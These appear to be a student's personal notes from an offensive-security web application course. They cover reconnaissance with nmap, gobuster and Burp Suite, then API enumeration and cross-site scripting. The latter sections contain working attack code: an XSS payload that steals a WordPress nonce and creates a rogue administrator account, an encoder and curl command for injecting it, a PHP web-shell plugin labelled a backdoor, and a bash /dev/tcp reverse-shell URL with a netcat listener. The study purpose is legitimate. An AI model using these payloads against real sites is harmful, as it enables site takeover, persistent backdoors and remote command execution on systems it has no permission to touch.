web applications

white box: unconstrained access to source code, infrasturecture and design documentations

black box: no info


Fingerprinting with nmap

initial active enumeration, enumeration of the web server

sudo nmap -p80 -sV <ip> service descovery on port 80 http port

sudo nmap -p80 --script=http-enum <ip> http enumeration script


Tech stack id with wappalyzer: passive
OS, UI framwork, webserver etc


gobuster:

directory brute force
dir mode: directory busting
-u: ip flag (url)
-w: brute force word list
-t: thread count, normally 10

gobuster dir -u <ip> -w /usr/share/wordlist/dirb/common.txt -t 5


Burp Suite:
GUI based for webb app security testing
ability to intercept HTTPS traffic (BURP certificate)
burpsuite to launch

Temporary project -> use burp defaults (select)->main UI

Proxy tool: intercept requests between web client and server

Proxy tab -> disable intercept tool(intercept tab)->proxy listener settings-> options sub-tab -> enables it on :8080

firefox must connect to 8080 inorder to intercept traffic
nav-> about:preferences#general->loopback ip address 127.0.0.1:8080



Repeater: new requests or mod the ones in history (replay attack)
rightlick a request in  proxy>HTTP Hisotry -> send to repeater


Intruder: config local /ect/hosts to statically assign ip to offsecwp website that's being tested

bypassing DNS: cat /etc/hosts
...
<ip> offsecwp

new burp session, configure proxy, nav to site with domain name, admin and test as ur and ps, login.
return to burp Proxy>HTTP History, rightclick POST request to the login page, send to intruder

in intruder tab, choose the post request, move to positions subtab, need to brute force the password since we know admin is correct

select the value of the pwd key and press add

using rockyou
cat /usr/share/wordlists/rockyou.txt | head

move to playload tab, paste the wordlist into simple list area

if firefox is burp proxy, burp closed firefox won't work
just use burp build in broswer


Web app enum
refer to the info retrieved passively during recon

ID compoenents that make up web app, many vulnerabilities are technology agnostic
note the db or os

tech stacks host os, web server db, front back end language

debugging page:
url address -> file extension as a port of a url can revel programming language: php, jsp, do or html

routes make url extensionslargelt irrelevant

source code, resources and content, inspect element


http response headers and sitemaps

search server responses for additional information

proxy like burp suite intercepts requests and browser's own network tool

network rool, launched from firefox web developer menu (in the inspect element)

clieck on a request to get more details
inspect reponse headers: HTTP headers

X- : non-standard HTTP header
RFC6648: replaced X-

X-Powered-By, x-amz-cd-id: amazon cloud font

site maps robots.txt tells the search engine bots what to crawl, 


Enumerating and Abusing API

gobuster to brute force api (REST)

-p for gobuster pattern feature since api paths are like: /api_name/v1

need to create a simple pattern file in the system:
{GOBUSTER}/v1
{GOBUSTER}/v2

placeholder for match word

gobuster dir -u <domain> -w /usr/share/wordlists/dirb/big.txt -p pattern

we can then inspect the api with curl
: curl -i <domain>/users/v1 for example
*-i is used to include the http header in the output

if we find something like admin:
gobuster dir -u <domain>/users/v1/admin -w /usr/share/wordlist/dirb/small.txt

by probing with curl and reading the returned error code we can determine what language the api uses to interact

hence enableing us to do something like this:

curl -d '{"passowrd":"fake","username":"admin"}' -H 'Content-Type:application/json' <domain>
*-d sepcifiies the data to send to the server via POST

the above commend is to test if the API uses content type json to interact



Cross site scripting

dynamically injecting content into page rendered by user's browser

Stored & Reflected

Stored: Presistent XSS. stored in db or cached by server, single stored xss can attack all users, forum software, in comment sections, product reviews anything that is stored and retrieved later

Reflected: crafted request or link, takes the value and places into page content, exploits $() 

DOM based, document object model, browser parse page's html content and generates an interna; dom representation, can be stored or relfected, when browser goes through content injected js is excuted by the DOM

most common input validation check: <> ' " {} ;

<> elements in html
{} js functions
' " for strings
; end of statement

most common are HTML and URL encoding (percent encoding)
convert non ascii and reserved character in URL such as converting space to %20

HTML encoding, display characters what normally have specual meaning, like tag elements &lt: chatacter for \<

if we can inject speical char in the page, browser will treat them as  code element


Basic XSS:

using burp: 
proxy > HTTP History, right click on the request and send to repeater

verification:
replace the default user agent calue with the a spript tage that includes the alert method: <script>alert (42)</script>

Prive esc with XSS
steal cookies and session info if app uses an insecure session management config, can steal auth cookie to masquerade

cookies to track state and info about user, cookies can be set with flags
we're intrested in 2: Secure and HttpOnly

Secure: only send cookie over encrypted connnections such as HTTPS

HttpOnly: deny JavaScript access to cookie, can use XSS payload to steal cookie if it is not set


nonce: server generated token that is included in HTTP request to add randomness and prevent CSRF attacks

to perform admin action need to gather nonce

nonce gathering payload

var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

admin account creation after nonce is gathered

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<username>&email=<email>&pass1=<password>&pass2=<password>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true); 
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

if above failed maybe try PUT

compress everything into a one liner to inject we use JS compress
https://jscompress.com/

function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)

encoding the code from jscompressed so we can send it via curl the above code can be excuted from the broswer console since it runs js


attacking:
curl -i <domain> --<compromised var> "<script>eval(String.fromCharCode(<payload>))</script>" --proxy 127.0.0.1:8080

important: use domain name, ip doesn't work for some reason
proxy is here so that burp can intercept it

viewing it in burp if request seems coorect, forward and attack


gobuster: if i get hit with a 301

use --exclude-length 0


var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<username>&email=<email>&pass1=<password>&pass2=<password>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true); 
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

reverse shell.php

<?php
/*
Plugin Name: Evil Plugin
Description: Backdoor for reverse shell access
Version: 1.0
Author: Attacker
*/

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

nc -lvnp <port> to listen to reverse shell

revershell: http://192.168.137.16/wp-admin/plugins/evilplugin/evilplugin.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/<kaliIP>/4444+0%3E%261%27